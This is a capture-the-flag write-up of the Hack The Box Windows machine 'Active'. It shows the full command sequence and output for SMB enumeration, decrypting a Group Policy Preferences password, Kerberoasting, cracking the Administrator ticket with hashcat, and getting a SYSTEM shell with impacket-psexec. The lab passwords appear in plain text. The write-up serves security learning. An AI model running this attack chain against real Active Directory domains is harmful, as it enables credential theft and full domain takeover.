`Box: Windows`
`Level: Easy`
### Index
1. [`Initial Nmap Enum`](#`Initial%20Nmap%20Enum`)
2. [SMB - Port 139 and 445](#SMB%20-%20Port%20139%20and%20445)
3. [Group Policy Preferences (GPP) Vulnerability](#Group%20Policy%20Preferences%20(GPP)%20Vulnerability)
	1. [`ASREPROAST Attack`](#`ASREPROAST%20Attack`)
	2. [`OverPass The Hash AKA Pass The Key Attack`](#`OverPass%20The%20Hash%20AKA%20Pass%20The%20Key%20Attack`)
4. [Kerberoasting Attack](#Kerberoasting%20Attack)
5. [Beyond Root](#Beyond%20Root)

### `Initial Nmap Enum`

Open ports and services.
```
$ nmap -p- --min-rate=1000 -Pn -T4 -sC -sV 10.10.10.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 02:04 EDT
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.032s latency).
Not shown: 65513 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-18 06:04:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-18T06:05:39
|_  start_date: 2024-08-18T06:02:51
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.60 seconds
```
### `SMB - Port 139 and 445`

Enumerating Shares 
```
$ smbclient --no-pass -L 10.10.10.100          
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Other than `Replication` Share, Everything else throwing Access Denied. 

Interesting files on the Replication Share
```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (3.3 KiloBytes/sec) (average 2.2 KiloBytes/sec)

$ more Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:4
6:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

### `Group Policy Preferences (GPP) Vulnerability`

First I tried to use my usual `hashid` command to identify the hash but it was throwing `Unknown Hash` error. Looking at the hash, I felt like it is not going to possible to decrypt it using our favorite `rockyou.txt`. Than I googled `SVC_TGS Microsoft` and found that this could be the [Group Policy Password (GPP) encryption](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp). But The link was more of using a MetaSploit module which require to have a session. I loved my `Impacket` Tool and found that using `impacket-Get-GPPPassword`, I can decrypt this hash. To be honest, I get an idea after reading the article in the above link. Here's the Snap of that Article. 

![](Pasted%20image%2020240818025415.png)

So in an ideal environment, the Groups.xml file  buried or backup on `SYSVOL` share. In our case, the access to `SYSVOL` share was not allowed but the access to `Replicatoin` Share was allowed. The Machine developer intentionally creates the `Replication` Share which is an image copy of `SYSVOL` Share. Anyways, We got our `Groups.xml`. Let's get the credentials. RTFM of `impacket-Get-GPPPassword` to better understand what is happening here. I read it.

```
$ impacket-Get-GPPPassword -xmlfile Groups.xml LOCAL 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Found a Groups XML file:
[*]   file      : Groups.xml
[*]   newName   : 
[*]   userName  : active.htb\SVC_TGS
[*]   password  : GPPstillStandingStrong2k18
[*]   changed   : 2018-07-18 20:46:06
```

Bingo!! We got our initial password for a user `SVC_TGS` account. But we are yet bit far from our initial Shell.

```
$ evil-winrm -i 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.10.10.100" port 5985 (10.10.10.100:5985)
Error: Exiting with code 1
```

###### `ASREPROAST Attack`

We know we have a valid set of credentials, but it is good idea to check whether the `DONT_REQ_PREAUTH` flag enabled. It means that the user doesn't require pre-authentication. When Pre-Authentication is disabled for a user, Attacker can impersonate that user by sending `KRB_AS_REQ` request and obtaining `KRB_AS_REP` from the KDC. To perform this attack we will use `impacket-GetNPUsers` as follows
```
$ impacket-GetNPUsers -request active.htb/SVC_TGS -no-pass  -dc-ip 10.10.10.100                              
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting TGT for SVC_TGS
[-] User SVC_TGS doesn't have UF_DONT_REQUIRE_PREAUTH set
```

###### `OverPass The Hash AKA Pass The Key Attack`

```
┌──(ringbuffer㉿kali)-[~/Downloads/Active.htb]
└─$ impacket-secretsdump active.htb/SVC_TGS@10.10.10.100 -just-dc-user Administrator -just-dc-ntlm
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:GPPstillStandingStrong2k18
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
┌──(ringbuffer㉿kali)-[~/Downloads/Active.htb]
└─$ impacket-secretsdump active.htb/SVC_TGS@10.10.10.100 -just-dc-user SVC_TGS -just-dc-ntlm
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:GPPstillStandingStrong2k18
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up..
```
### Kerberoasting Attack

The Kerberoasting Attack  require a low privilege valid set of credentials. In our case, we have that for the user `SVC_TGS`. In a Kerberoasting attack, the goal is to obtain the Ticket Granting Service (TGS) for a service associated with a domain user account (not a machine user). To execute this attack, we’ll use `impacket-GetNPUsers` and a low-privilege domain account.

Now we are going to use `impacket-GetUserSPNs` to query the target domain for the SPNs that are running under the `SVC_TGS` user account. 
```
$ impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-08-18 22:46:33.894167             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$fe4cbab3c535bd5fc3f39bb30d42d007$2d0202fe9f9cfc9898f9dd2e8b92d2759ccb18184920447a3809f00412a11edfafbfe673ea8ecbc0551ec7df4a9fef747ff3e92b72061ea1d9c136bdfa7c804c30d882aceb8a5b7feb314b1d60ad272bb47d49dacea12510c56b5fc5d3bd1fe0feb4ad6cba1181f033b67bde5c09ea6114b86c11e879b708a6a8f6992693bc63d052f097fe8cf79414130bd99a2c6dd7f3a2d644372efc2480618b5a4207543fddddace4092158ac424606bd57daa5fff3c3254193257d88f7cce8a5c974a9be8e3f68bfeca729e76b3bac0f63ec63d6f32c54a05d93a1d1ee3400f8be916bb4b24327a139b1dceca6e7d4135af62df6e334bc2d70ed1524d92cf8545c9916233a31f7c5d8448dcf6954fdf14fed377f6e4063d1824c75783e23be56f00d3f91aaccd3e00e3d8d880946ee0902e559e70092fc0455c439ddb9bf24ad6f5995cda201aba31f7ee7ffe811aa437bee4401bb65479c522204c43e4bf48f1d06370cc34cc27c0f364bcdb056abadef86abf9cb569d8f1039cb0ce8a1f2c738c5e1839bc09fa2eab92fb62009d943023b022c996a6fe1760f30f8f515da6c0ffca3db2ba78482e6c35972a8f29bdb62cac611546a141cc0cd67678cb939ec5c290bc7bf203f558560f3a03679f5270d4f9f6e0c0144f5810d5e5725278f0626b9ca8a08b8a849815fc476b55cc3f3c3755d6b751975aeb3f63c010aeab6f5eea81d49617a33ea661bf3aa1df4124bbfc652affaab3f2044e212e66074b3db3dfbd2f269cc6256d9a2392378882c2719d31f8d6b823a29fe572bd02282747eb199f9b2a016636e2fb1f15155b7f01de01e214f3a8623a395f9648cc92c56cd7e2359cb2921ba8fde1d327ebc68a8a5ee43bd8d3e145756d729f0e780078b03edca32b5dd9684997add6fd82f9360dac62c2874f1cd8555e84d827956cd6ffaf940c780a0e67ee71a5be36855956b588f32f0a840ade25e2afb878f9414cc40a465f9248d83826d8b9c7fdc5bd4d50887da2f97bd747323c450c79f9d03415f5f10f7efeeed628355ad324822bb6af3a8640c5cba7dbd0886054e7ae63aa7e3b4476fd284a303d1e675410596cb8a1cb2691b0b74c64e4ddb203ae98c0083b75295dc41791b2cf3afd287112dc18e427ba1fc37bb863816ff146e297f4a17cb3abdf4a853a9724b3f310f6429dcdedbe5e217d1a78864da3ef94e9608c0d124df9c269bc46dd837dde4e5d6ae4942fd6f9cab5100d31c940ea00564af00
```

Great!! Look at the `Service Principal Name: active/CIFS:445` and the Service ticket. The Service Ticket `$krb5tgs (TGS)` we have obtained here is a valid TGS to access the CIFS Share on port 445 with the `Administrator` Privileges.  We are going to save this ticket as a `krghash.txt` file and use the `hashcat` to crack the password.

```
$ hashcat --help | grep 13100                                          
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol

$ hashcat -m 13100 -a 0 krbhash.txt /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$fe4cbab3c535bd5fc3f39bb30d42d007$2d0202fe9f9cfc9898f9dd2e8b92d2759ccb18184920447a3809f00412a11edfafbfe673ea8ecbc0551ec7df4a9fef747ff3e92b72061ea1d9c136bdfa7c804c30d882aceb8a5b7feb314b1d60ad272bb47d49dacea12510c56b5fc5d3bd1fe0feb4ad6cba1181f033b67bde5c09ea6114b86c11e879b708a6a8f6992693bc63d052f097fe8cf79414130bd99a2c6dd7f3a2d644372efc2480618b5a4207543fddddace4092158ac424606bd57daa5fff3c3254193257d88f7cce8a5c974a9be8e3f68bfeca729e76b3bac0f63ec63d6f32c54a05d93a1d1ee3400f8be916bb4b24327a139b1dceca6e7d4135af62df6e334bc2d70ed1524d92cf8545c9916233a31f7c5d8448dcf6954fdf14fed377f6e4063d1824c75783e23be56f00d3f91aaccd3e00e3d8d880946ee0902e559e70092fc0455c439ddb9bf24ad6f5995cda201aba31f7ee7ffe811aa437bee4401bb65479c522204c43e4bf48f1d06370cc34cc27c0f364bcdb056abadef86abf9cb569d8f1039cb0ce8a1f2c738c5e1839bc09fa2eab92fb62009d943023b022c996a6fe1760f30f8f515da6c0ffca3db2ba78482e6c35972a8f29bdb62cac611546a141cc0cd67678cb939ec5c290bc7bf203f558560f3a03679f5270d4f9f6e0c0144f5810d5e5725278f0626b9ca8a08b8a849815fc476b55cc3f3c3755d6b751975aeb3f63c010aeab6f5eea81d49617a33ea661bf3aa1df4124bbfc652affaab3f2044e212e66074b3db3dfbd2f269cc6256d9a2392378882c2719d31f8d6b823a29fe572bd02282747eb199f9b2a016636e2fb1f15155b7f01de01e214f3a8623a395f9648cc92c56cd7e2359cb2921ba8fde1d327ebc68a8a5ee43bd8d3e145756d729f0e780078b03edca32b5dd9684997add6fd82f9360dac62c2874f1cd8555e84d827956cd6ffaf940c780a0e67ee71a5be36855956b588f32f0a840ade25e2afb878f9414cc40a465f9248d83826d8b9c7fdc5bd4d50887da2f97bd747323c450c79f9d03415f5f10f7efeeed628355ad324822bb6af3a8640c5cba7dbd0886054e7ae63aa7e3b4476fd284a303d1e675410596cb8a1cb2691b0b74c64e4ddb203ae98c0083b75295dc41791b2cf3afd287112dc18e427ba1fc37bb863816ff146e297f4a17cb3abdf4a853a9724b3f310f6429dcdedbe5e217d1a78864da3ef94e9608c0d124df9c269bc46dd837dde4e5d6ae4942fd6f9cab5100d31c940ea00564af00:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

Great!! We have got the password `Ticketmaster1968` to access the CIFS server as an Administrator user. Let's Login to CIFS.

```
$ impacket-smbclient -port 445 active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

# ls
[-] No share selected
# dir
*** Unknown syntax: dir
# shares
ADMIN$
C$
IPC$
NETLOGON
Replication
SYSVOL
Users
# cd Users
[-] No share selected
# use Users
# ls
drw-rw-rw-          0  Sat Jul 21 10:39:20 2018 .
drw-rw-rw-          0  Sat Jul 21 10:39:20 2018 ..
drw-rw-rw-          0  Mon Jul 16 06:14:21 2018 Administrator
drw-rw-rw-          0  Mon Jul 16 17:08:56 2018 All Users
drw-rw-rw-          0  Mon Jul 16 17:08:47 2018 Default
drw-rw-rw-          0  Mon Jul 16 17:08:56 2018 Default User
-rw-rw-rw-        174  Mon Jul 16 17:01:17 2018 desktop.ini
drw-rw-rw-          0  Mon Jul 16 17:08:47 2018 Public
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 SVC_TGS
# cd SVC_TGS
# ls
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 .
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 ..
drw-rw-rw-          0  Sat Jul 21 11:14:20 2018 Contacts
drw-rw-rw-          0  Sat Jul 21 11:14:42 2018 Desktop
drw-rw-rw-          0  Sat Jul 21 11:14:28 2018 Downloads
drw-rw-rw-          0  Sat Jul 21 11:14:50 2018 Favorites
drw-rw-rw-          0  Sat Jul 21 11:15:00 2018 Links
drw-rw-rw-          0  Sat Jul 21 11:15:23 2018 My Documents
drw-rw-rw-          0  Sat Jul 21 11:15:40 2018 My Music
drw-rw-rw-          0  Sat Jul 21 11:15:50 2018 My Pictures
drw-rw-rw-          0  Sat Jul 21 11:16:05 2018 My Videos
drw-rw-rw-          0  Sat Jul 21 11:16:20 2018 Saved Games
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 Searches
# cd Desktop
# ls
drw-rw-rw-          0  Sat Jul 21 11:14:42 2018 .
drw-rw-rw-          0  Sat Jul 21 11:14:42 2018 ..
-rw-rw-rw-         34  Sun Aug 18 22:46:30 2024 user.txt
# more user.txt
*** Unknown syntax: more user.txt
# type user.txt
*** Unknown syntax: type user.txt
# get user.txt

### ON KALI ###
more user.txt
```

Bingo!! We Got our User Flag. We can get our root.txt the same way. **Because the user Administrator is vulnerable to Kerberoasting Attack and can access the Admin's Desktop Folder**

```
# 
# dir
*** Unknown syntax: dir
# ls
drw-rw-rw-          0  Sat Jul 21 11:14:42 2018 .
drw-rw-rw-          0  Sat Jul 21 11:14:42 2018 ..
-rw-rw-rw-         34  Sun Aug 18 22:46:30 2024 user.txt
# cd ..
# ls
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 .
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 ..
drw-rw-rw-          0  Sat Jul 21 11:14:20 2018 Contacts
drw-rw-rw-          0  Sat Jul 21 11:14:42 2018 Desktop
drw-rw-rw-          0  Sat Jul 21 11:14:28 2018 Downloads
drw-rw-rw-          0  Sat Jul 21 11:14:50 2018 Favorites
drw-rw-rw-          0  Sat Jul 21 11:15:00 2018 Links
drw-rw-rw-          0  Sat Jul 21 11:15:23 2018 My Documents
drw-rw-rw-          0  Sat Jul 21 11:15:40 2018 My Music
drw-rw-rw-          0  Sat Jul 21 11:15:50 2018 My Pictures
drw-rw-rw-          0  Sat Jul 21 11:16:05 2018 My Videos
drw-rw-rw-          0  Sat Jul 21 11:16:20 2018 Saved Games
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 Searches
# cd ..
# ls
drw-rw-rw-          0  Sat Jul 21 10:39:20 2018 .
drw-rw-rw-          0  Sat Jul 21 10:39:20 2018 ..
drw-rw-rw-          0  Mon Jul 16 06:14:21 2018 Administrator
drw-rw-rw-          0  Mon Jul 16 17:08:56 2018 All Users
drw-rw-rw-          0  Mon Jul 16 17:08:47 2018 Default
drw-rw-rw-          0  Mon Jul 16 17:08:56 2018 Default User
-rw-rw-rw-        174  Mon Jul 16 17:01:17 2018 desktop.ini
drw-rw-rw-          0  Mon Jul 16 17:08:47 2018 Public
drw-rw-rw-          0  Sat Jul 21 11:16:32 2018 SVC_TGS
# cd Administrator
# ls
drw-rw-rw-          0  Mon Jul 16 06:14:21 2018 .
drw-rw-rw-          0  Mon Jul 16 06:14:21 2018 ..
drw-rw-rw-          0  Sun Aug 18 22:45:56 2024 AppData
drw-rw-rw-          0  Mon Jul 16 06:14:15 2018 Application Data
drw-rw-rw-          0  Mon Jul 30 09:50:10 2018 Contacts
drw-rw-rw-          0  Mon Jul 16 06:14:15 2018 Cookies
drw-rw-rw-          0  Thu Jan 21 11:49:46 2021 Desktop
drw-rw-rw-          0  Mon Jul 30 09:50:10 2018 Documents
drw-rw-rw-          0  Thu Jan 21 11:52:32 2021 Downloads
# cd Desktop
# ls
drw-rw-rw-          0  Thu Jan 21 11:49:46 2021 .
drw-rw-rw-          0  Thu Jan 21 11:49:46 2021 ..
-rw-rw-rw-        282  Mon Jul 30 09:50:10 2018 desktop.ini
-rw-rw-rw-         34  Sun Aug 18 22:46:30 2024 root.txt
# get root.txt
# 

### ON KALI ###
more root.txt
```

Got the Root Flag!!

### Beyond Root

Usually I exhaust by the time I get the root flag. But this time I wanted to have `NT AUTHORITY/SYSTEM` shell on the box. I achieved it using `impacket-psexec` as follow.

```
┌──(ringbuffer㉿kali)-[~/Downloads/Active.htb]
└─$ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file cmdrCeEj.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service bDEe on 10.10.10.100.....
[*] Starting service bDEe.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```